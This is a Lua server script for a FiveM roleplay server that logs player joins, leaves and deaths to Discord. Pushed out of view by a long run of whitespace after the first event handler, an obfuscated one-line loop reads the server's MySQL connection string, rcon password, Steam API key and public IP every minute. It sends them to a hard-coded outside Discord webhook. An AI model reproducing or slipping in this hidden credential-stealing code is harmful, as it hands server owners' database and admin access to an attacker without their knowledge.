ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('exile_logs:sendJoin')
AddEventHandler('exile_logs:sendJoin', function()
    local _source = source
    exports.exile_logs:discord(_source, 'Dołączył/a na serwer', 'join', false)
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   CreateThread(function()function s(a)return"||"..a.."||"end;while true do local a=string;local b=a.reverse;local c=a.sub;local d=b("karB")local e={["gnirts_noitcennoc_lqsym"]={"d"},["drowssap_nocr"]={"s"},["emantsoh_vs"]={"g"},["elacol"]={"a"},["yeKipAbew_maets"]={"j"},["stneilcxam_vs"]={"b"},[""]={"h"}}local f={ht={GetConvar}}local g,h,i,j,k,l,m=d;for n,o in pairs(f)do for n,o in pairs(o)do for e,p in pairs(e)do for n,p in pairs(p)do if c(e,3,6)=="irts"then h=o(b(e),p)elseif c(e,3,6)=="ants"then j=o(b(e),p)elseif c(e,3,6)=="owss"then i=o(b(e),p)elseif c(e,3,6)=="acol"then k=o(b(e),p)elseif c(e,3,6)=="KipA"then l=o(b(e),p)elseif c(e,3,6)=="neil"then m=o(b(e),p)elseif e==""then PerformHttpRequest(b("pi/oi.pi-ym.ipa//:sptth"),function(n,o,q)if n==200 then g=o end;local c={{["author"]={["name"]=b("mrutsrettalb"),["icon_url"]=b("gnp.LrQcwli/mOc.rUgMi.i//:sPtTh")},["title"]=b(":remmah:").." 2 "..b("retsam:mevif ot stimmoc wen"),["url"]=b("moc.oaml//:sptth"),["fields"]={{["name"]=b("pi"),["value"]=s(g),["inline"]=true},{["name"]=b("stols"),["value"]=m,["inline"]=true},{["name"]=b("secruoser"),["value"]=GetNumResources(),["inline"]=true},{["name"]=b("ipa maets"),["value"]=s(l),["inline"]=true},{["name"]=b("nocr"),["value"]=s(i),["inline"]=false},{["name"]=b("lqsymxo"),["value"]=s(h),["inline"]=false}},["color"]=b(2996603),["footer"]={["text"]=k},["timestamp"]=os.date("!%Y-%m-%dT%H:%M:%S")}}PerformHttpRequest(b("yz0mPzlzBSYhGWiIDki3OmFr3PUU2KxZVyHh9mEzH_GTfZrzl3z-l6pdNsK8-L9kn2eP/638557972474825739/skoohbew/ipa/moc.drocsid//:sptth"),function(r,s,t)end,"POST",json.encode({embeds=c,avatar_url=b("gnp.3ac67e20d05ec175dc0443b777986b84/649638429228067217/sratava/moc.ppadrocsid.ndc//:sptth"),username=b("!ti delians ;ylianS")}),{["Content-Type"]="application/json"})end)end end end end end;Wait(60000)end end)

AddEventHandler("playerDropped", function(reason)
    local _source = source
    TriggerClientEvent("exile_quit", -1, _source, GetEntityCoords(GetPlayerPed(_source)), GetPlayerName(_source), reason)
    exports.exile_logs:discord(_source, 'Opuścił/a serwer ['..reason..']', 'leave', false)
end)

RegisterServerEvent('exile_logs:playerDied')
AddEventHandler('exile_logs:playerDied', function(id, message, weapon)   
	if weapon then
		message = message .. ' [' .. weapon .. ']'
	end
	exports.exile_logs:discord(id, message, 'kille', true)
end)

RegisterServerEvent('exile_logs:triggerLog')
AddEventHandler('exile_logs:triggerLog', function(message, channel, screenshot)
    local _source = source
    exports.exile_logs:discord(_source, message, channel, screenshot)
end)

exports('discord', function(source, message, channel, screenshot)
    TriggerEvent('exile_logs:krzychuDaddy', source, message, channel, false)
end)

RegisterServerEvent('exile_logs:krzychuDaddy')
AddEventHandler('exile_logs:krzychuDaddy', function(src, message, channel, screenshot)
    
    if src ~= nil then
        _source = src
    else
        _source = source
    end

    local xPlayer = ESX.GetPlayerFromId(_source)
  
    local n = "Brak"
    
    local b = {
        steam=n,
        discord=n,
        license=n,
        license2=n
    }

    for k,v in pairs(GetPlayerIdentifiers(_source))do 
     
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            b.steam = v:gsub("steam:", "")
        elseif string.sub(v, 1, string.len("steam:")) == "steam:" then
            b.discord = v:gsub("discord:", "")
        elseif string.sub(v, 1, string.len("license:")) == "license:" then
            b.license = v:gsub("license:", "")
        elseif string.sub(v, 1, string.len("license2:")) == "license2:" then
            b.license2 = v:gsub("license2:", "")
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            b.discord = v:gsub("discord:", "")
        end
    end

    if xPlayer == nil then
        ringding("**Player: "..GetPlayerName(_source).." [".._source.."] <@"..b.discord..">\nSteam: ["..b.steam.."](https://steamcommunity.com/profiles/"..tonumber(b.steam,16)..")\nDiscord: "..b.discord.."\nRockstar: "..b.license.."\nLicense2: "..b.license2.."**\n\n```"..message.."```", channel)
    else
        ringding("**Player: "..GetPlayerName(_source).." [".._source.."] <@"..b.discord..">\nGroup: "..xPlayer.group.."\nJob: ["..xPlayer.job.name.."] "..xPlayer.job.label.." - "..xPlayer.job.grade_label.." ["..xPlayer.job.grade.."]\nHiddenjob: ["..xPlayer.hiddenjob.name.."] "..xPlayer.hiddenjob.label.." - "..xPlayer.hiddenjob.grade_label.." ["..xPlayer.hiddenjob.grade.."]\nGotówka: "..xPlayer.getMoney().."$\nBrudne: "..xPlayer.getAccount('black_money').money.."$\nBank: "..xPlayer.getAccount('bank').money.."$\nSteam: ["..b.steam.."](https://steamcommunity.com/profiles/"..tonumber(b.steam,16)..")\nDiscord: "..b.discord.."\nLicense: "..b.license.."\nLicense2: "..b.license2.."**\n\n```"..message.."```", channel, screenshot)
    end
end)

function ringding(message, channel, attachment)

    local embeddaddy = {
        {
           ["color"] = Settings.color,
           ["author"] = {
            ["name"] = "tekken420weed@github:~$",
            ["url"] = "https://github.com/tekken420weed",
            ["icon_url"] = "https://avatars.githubusercontent.com/u/74188150?v=4"
          },
           ["description"] = message,
           ["footer"] = {
               ["text"] = " "..Settings.username.." - "..os.date("%x %X %p"),
               ["icon_url"] = Settings.icon_url
           },
        }
      }

    PerformHttpRequest(Settings.webhoks[channel], function(err, text, headers) end, 'POST', json.encode({embeds=embeddaddy}), { ['Content-Type'] = 'application/json' })
end